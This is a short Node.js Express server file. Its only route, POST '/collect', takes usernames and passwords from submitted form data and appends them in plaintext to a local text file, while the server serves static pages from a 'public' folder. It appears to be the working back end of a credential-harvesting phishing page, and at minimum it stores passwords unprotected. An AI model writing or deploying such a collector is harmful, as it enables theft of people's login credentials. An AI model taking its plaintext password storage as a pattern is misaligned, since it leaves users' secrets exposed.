const express = require('express');
const fs = require('fs');
const app = express();
const port = 3000;

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Serve static files from the "public" directory
app.use(express.static('public'));

// POST route for data collection
app.post('/collect', (req, res) => {
  const { username, password } = req.body;

  // Create a string representation of the data
  const dataString = `Username: ${username}\nPassword: ${password}\n\n`;

  // Append the data to a text file
  fs.appendFile('data.txt', dataString, (err) => {
    if (err) {
      console.error('Error saving data:', err);
      res.status(500).json({ message: 'Error saving data' });
    } else {
      console.log('Data saved successfully');
      res.json({ message: 'Data collected and saved successfully' });
    }
  });
});

// Start the server
app.listen(port, () => {
  console.log(`Server is running on port ${port}`);
});
